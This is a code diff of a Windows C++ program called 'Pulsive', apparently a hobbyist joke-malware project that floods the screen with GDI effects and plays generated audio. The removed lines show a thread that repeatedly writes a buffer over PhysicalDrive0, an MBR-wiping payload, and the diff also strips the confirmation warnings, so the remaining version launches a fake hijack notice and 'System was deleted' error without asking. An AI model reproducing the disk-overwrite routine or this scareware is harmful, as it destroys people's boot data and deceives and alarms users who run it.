@@ -2,7 +2,6 @@
 #define _USE_MATH_DEFINES 1
 #pragma comment(lib, "winmm.lib")
 #include <cmath>
-#include "PulsiveMBR.h"
 #include <iostream>
 #include <fstream>
 #include <stdlib.h>
@@ -21,7 +20,7 @@ typedef union _RGBQUAD {
 }_RGBQUAD, * PRGBQUAD;
 int red, green, blue;
 bool ifcolorblue = false, ifblue = false;
-COLORREF Hue(int length) { //Credits to Void_/GetMBR
+COLORREF Hue(int length) {
 	if (red != length) {
 		red < length; red++;
 		if (ifblue == true) {
@@ -172,7 +171,7 @@ DWORD WINAPI GDI3(LPCVOID lpparam) {
 	}
 }
 
-DWORD WINAPI GDI5(LPVOID lpparam) {
+DWORD WINAPI GDI5(LPVOID lpparam) {//BY pankoza
 	SetProcessDPIAware();
 	int time = GetTickCount();
 	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
@@ -249,34 +248,16 @@ DWORD WINAPI GDI6(LPVOID lpparam) {
 	}
 }
 
-
-DWORD WINAPI PULSIVE(LPVOID lpParam) {
-	while (1) {
-		DWORD dwBytesWritten;
-		HANDLE hDevice = CreateFileW(
-			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
-			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
-			OPEN_EXISTING, 0, 0);
-
-		WriteFile(hDevice, PULSIVER, 32768, &dwBytesWritten, 0);
-		CloseHandle(hDevice);
-	}
-}
-
 using namespace std;
-DWORD WINAPI notepad(){
-	std::ofstream outfile("MERTED.txt");
-	outfile << "Your PC has been hijacked by pulsive.\nDo not try restart pc or shutdown.\nIf you trying this, your pc will be trash." << std::endl;
+DWORD WINAPI notepad() {
+	std::ofstream outfile("Pulsive made by ptr35(KT).txt");
+	outfile << "Your PC has been hijacked by pulsive.\nDo not try restart pc or shutdown.\nIf you trying this, your pc will be trash.\n(This is safe edition LOL!)" << std::endl;
 	outfile.close();
-	system("notepad c:\MERTED.txt");
+	system("notepad c:\Pulsive made by ptr35(KT).txt");
 	return 0;
 }
 
-DWORD WINAPI registry(LPVOID lpparam) {
-
-}
-
-DWORD WINAPI MSG() {
+DWORD WINAPI TEST2(LPVOID lpparam) {
 	MessageBox(NULL, TEXT("System was deleted."), TEXT("ERROR"), MB_OK | MB_ICONERROR);
 	return 0;
 }
@@ -287,7 +268,7 @@ VOID WINAPI S1() {
 	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
 	char buffer[8000 * 10] = {};
 	for (DWORD t = 0; t < sizeof(buffer); ++t)
-		buffer[t] = static_cast<char>( t >> 6 ) + ( t >> 6 ) * ( t >> 4 ) >> ( 16 << t & t >> 2 ) & 200;
+		buffer[t] = static_cast<char>(t >> 6) + (t >> 6) * (t >> 4) >> (16 << t & t >> 2) & 200;
 
 	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
 	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
@@ -302,7 +283,7 @@ VOID WINAPI S2() {
 	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
 	char buffer[8000 * 30] = {};
 	for (DWORD t = 0; t < sizeof(buffer); ++t)
-		buffer[t] = static_cast<char>( t * ( t >> 2 | t >> 10 ) | ( t >> 6 ) * ( t >> 2 ));
+		buffer[t] = static_cast<char>(t * (t >> 2 | t >> 10) | (t >> 6) * (t >> 2));
 
 	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
 	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
@@ -317,7 +298,7 @@ VOID WINAPI S3() {
 	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
 	char buffer[8000 * 30] = {};
 	for (DWORD t = 0; t < sizeof(buffer); ++t)
-		buffer[t] = static_cast<char>( t >> 6 ) + ( t >> 6 ) * ( t >> ( t << 8 ) );
+		buffer[t] = static_cast<char>(t >> 6) + (t >> 6) * (t >> (t << 8));
 
 	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
 	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
@@ -343,38 +324,24 @@ VOID WINAPI S4() {
 
 int main()
 {
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
-	if (MessageBoxW(NULL, L"This file is malicious file.\nIf you running this file, maybe computer was destroy, or steel sensitive information. run this file?", L"Windows defender antivirus - Trojan.Win32.Pulsive", MB_YESNO | MB_ICONINFORMATION) == IDNO)
-	{
-		ExitProcess(0);
-	}
-	else
-	{
-		if (MessageBoxW(NULL, L"WARNING.\nTHIS IS LAST WARNING, IF YOU RUNNING THIS FILE, COMPUTER WILL TRASH. RUN FILE?", L"Windows defender antivirus - Trojan.Win32.Pulsive - Last Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
-		{
-			ExitProcess(0);
-		}
-		else {
-			HANDLE ntpd = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)notepad, 0, 0, 0);
-			HANDLE msg = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MSG, 0, 0, 0);
-			Sleep(3000);
-			HANDLE GDIscreen1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI1, 0, 0, 0);
-			S1();
-			Sleep(10000);
-			TerminateThread(GDIscreen1, 0);
-			CloseHandle(GDIscreen1);
-			InvalidateRect(0, 0, 0);
-			S2();
-			HANDLE GDIscreen2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI2, 0, 0, 0);
-			HANDLE GDIscreen3 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI3, 0, 0, 0);
-			HANDLE GDIscreen4 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI4, 0, 0, 0);
-			HANDLE GDIscreen5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI5, 0, 0, 0);
-			HANDLE GDIscreen6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI6, 0, 0, 0);
-			Sleep(30000);
-			S3();
-			Sleep(30000);
-			S4();
-			Sleep(INFINITE);
-		}
-	}
+	HANDLE ntpd = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)notepad, 0, 0, 0);
+	HANDLE msg = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)TEST2, 0, 0, 0);
+	Sleep(3000);
+	HANDLE GDIscreen1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI1, 0, 0, 0);
+	S1();
+	Sleep(10000);
+	TerminateThread(GDIscreen1, 0);
+	CloseHandle(GDIscreen1);
+	InvalidateRect(0, 0, 0);
+	S2();
+	HANDLE GDIscreen2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI2, 0, 0, 0);
+	HANDLE GDIscreen3 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI3, 0, 0, 0);
+	HANDLE GDIscreen4 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI4, 0, 0, 0);
+	HANDLE GDIscreen5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI5, 0, 0, 0);
+	HANDLE GDIscreen6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI6, 0, 0, 0);
+	Sleep(30000);
+	S3();
+	Sleep(30000);
+	S4();
+	Sleep(INFINITE);
 }
